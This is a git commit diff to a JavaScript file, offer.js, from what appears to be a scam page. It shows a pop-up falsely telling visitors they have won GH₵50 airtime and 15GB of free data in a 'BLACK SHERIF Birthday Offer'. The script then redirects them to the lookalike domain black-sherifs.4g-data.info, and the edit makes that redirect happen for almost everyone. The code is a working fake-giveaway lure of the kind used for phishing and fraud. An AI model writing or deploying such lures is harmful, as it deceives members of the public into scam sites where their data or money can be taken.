a33f3e24102c5696961a167c6d6ae2dc70426ec9
codexken <inyeneawakessien@gmail.com>
2024-07-04 18:07:05 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '1'
-password=prompt('SMS: Congratulations You are among the 10,000 fans to receive GH₵50 Airtime and 15GB Free Data From BLACK SHERIF Birthday Offer, Kindly Press 1 to ACTIVATE ','1');
+var password = '15GB Free Data'
+password=prompt('SMS: Congratulations You are among the 10,000 fans to receive GH₵50 Airtime and 15GB Free Data From BLACK SHERIF Birthday Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
 if (password != '1') {
 location.href='https://black-sherifs.4g-data.info/15GB';
 }
